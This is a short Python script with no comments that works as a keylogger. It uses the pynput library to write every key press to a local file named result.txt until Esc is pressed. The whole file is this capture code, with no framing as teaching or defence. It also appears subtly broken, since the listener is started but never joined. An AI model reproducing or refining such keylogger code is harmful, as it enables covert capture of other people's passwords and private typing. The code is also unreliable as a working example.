from pynput import keyboard

def on_press(key):
    try:
        file.write(str(key))
        if key == keyboard.Key.esc:
            file.close()
            return False
            
    except AttributeError:
        print("Error Occured")

        
def main():
    listener = keyboard.Listener(on_press = on_press);
    listener.start()
    
file = open('result.txt', "w")
file.write("")
file.close()
file = open('result.txt', "a")

if __name__ == "__main__":
    main()
